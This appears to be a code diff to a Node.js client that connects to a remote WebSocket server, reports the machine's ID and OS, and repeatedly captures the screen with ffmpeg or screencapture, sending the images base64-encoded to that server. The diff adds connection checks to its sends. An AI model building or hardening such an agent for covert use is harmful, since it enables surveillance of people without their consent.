@@ -24,6 +24,8 @@ if (!fs.existsSync(persistDir)) {
 
 function initConnection() {
     console.log(`Attempting to connect to ${WS_URL}...`);
+    
+    // Create new instance
     ws = new WebSocket(WS_URL);
 
     ws.on('open', () => {
@@ -33,7 +35,7 @@ function initConnection() {
         console.log(`Connected with ID: ${myId}`);
 
         // Send info as a STRINGIFIED JSON object
-        ws.send(JSON.stringify({
+        safeSend(JSON.stringify({
             type: 'info',
             id: myId,
             os: os.platform(),
@@ -65,7 +67,7 @@ function initConnection() {
 
     ws.on('error', (err) => {
         console.error('WebSocket error:', err.message);
-        reconnect();
+        // Don't reconnect immediately on error, wait for close or handle gracefully
     });
 }
 
@@ -78,6 +80,15 @@ function reconnect() {
     } else {
         console.log("Max reconnection attempts reached.");
         keepAlive();
+    }
+}
+
+// Helper to safely send data only if connected
+function safeSend(data) {
+    if (ws && ws.readyState === WebSocket.OPEN) {
+        ws.send(data);
+    } else {
+        console.log(`Skipping send: WebSocket state is ${ws ? ws.readyState : 'undefined'}`);
     }
 }
 
@@ -98,6 +109,7 @@ function startMonitoring() {
 }
 
 function captureScreen() {
+    // Check if we are actually connected before starting async work
     if (!ws || ws.readyState !== WebSocket.OPEN) return;
 
     const imgPath = path.join(os.tmpdir(), 'screen.png');
@@ -110,8 +122,8 @@ function captureScreen() {
             exec(`ffmpeg -y -f avfoundation -framerate 1 -i "1" -frames:v 1 ${imgPath}`, (err2) => {
                 if (!err2 && fs.existsSync(imgPath)) {
                     const img = fs.readFileSync(imgPath);
-                    // FIX: Stringify the object before sending
-                    ws.send(JSON.stringify({
+                    // FIX: Stringify the object before sending AND check connection
+                    safeSend(JSON.stringify({
                         type: 'screen_data',
                         id: myId,
                         data: img.toString('base64')
@@ -120,8 +132,8 @@ function captureScreen() {
             });
         } else if (!err && fs.existsSync(imgPath)) {
             const img = fs.readFileSync(imgPath);
-            // FIX: Stringify the object before sending
-            ws.send(JSON.stringify({
+            // FIX: Stringify the object before sending AND check connection
+            safeSend(JSON.stringify({
                 type: 'screen_data',
                 id: myId,
                 data: img.toString('base64')
